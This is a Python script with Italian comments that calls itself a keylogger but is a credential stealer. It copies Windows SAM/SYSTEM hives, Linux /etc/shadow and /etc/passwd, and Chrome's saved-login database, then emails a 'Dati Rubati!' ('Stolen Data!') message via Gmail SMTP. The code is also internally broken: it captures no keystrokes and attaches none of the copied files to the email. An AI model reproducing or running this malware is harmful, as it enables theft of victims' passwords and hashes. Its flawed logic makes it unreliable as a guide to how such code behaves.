import os
import shutil
import subprocess
import smtplib
import platform
import getpass

# Funzione per inviare email con i dati raccolti
def send_email(username, password, to_email, subject, body):
    from_email = username
    email_text = f"From: {from_email}\nTo: {to_email}\nSubject: {subject}\n\n{body}"

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(username, password)
        server.sendmail(from_email, to_email, email_text)
        server.quit()
        print("Email inviata con successo!")
    except Exception as e:
        print(f"Errore durante l'invio dell'email: {str(e)}")

# Funzione per leggere le password dalla cache del sistema
def dump_cached_passwords():
    try:
        if platform.system() == "Windows":
            cached_files = ["C:\\Windows\\System32\\config\\SAM", "C:\\Windows\\System32\\config\\SYSTEM"]
        elif platform.system() == "Linux":
            cached_files = ["/etc/shadow", "/etc/passwd"]
        else:
            print("Sistema operativo non supportato.")
            return

        for file_path in cached_files:
            shutil.copy2(file_path, ".")
            print(f"Password catturata da {file_path}")
    except Exception as e:
        print(f"Errore durante il dump delle password: {str(e)}")

# Funzione per leggere le password salvate nei browser
def dump_browser_passwords():
    try:
        if platform.system() == "Windows":
            subprocess.run(["cmd", "/C", "cd %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default && copy Login Data ."], shell=True)
            print("Password catturate dai browser.")
        elif platform.system() == "Linux":
            print("Password catturate dai browser (non supportato su Linux).")
        else:
            print("Sistema operativo non supportato.")
    except Exception as e:
        print(f"Errore durante il dump delle password dai browser: {str(e)}")

# Funzione principale per eseguire il keylogger
def run_keylogger(username, password, to_email):
    try:
        # Dump delle password dalla cache del sistema
        dump_cached_passwords()

        # Dump delle password dai browser
        dump_browser_passwords()

        # Invio dei dati raccolti
        subject = "Dati Rubati!"
        body = "Ecco i dati rubati dal tuo malefico keylogger."
        send_email(username, password, to_email, subject, body)
    except Exception as e:
        print(f"Errore durante l'esecuzione del keylogger: {str(e)}")

# Esecuzione del keylogger
if __name__ == "__main__":
    # Interfaccia Nmap-style
    print("------- Interfaccia per il Keylogger ---------")
    print("----------------------------------------------")
    print("1. Esegui keylogger")
    print("2. Esci")

    choice = input("Seleziona un'opzione: ")

    if choice == "1":
        # Impostazioni
        username = input("Inserisci il tuo indirizzo email: ")
        password = getpass.getpass("Inserisci la tua password: ")
        to_email = input("Inserisci l'indirizzo email del destinatario: ")

        # Esecuzione del keylogger
        run_keylogger(username, password, to_email)
    elif choice == "2":
        print("Uscita dal programma.")
    else:
        print("Scelta non valida.")
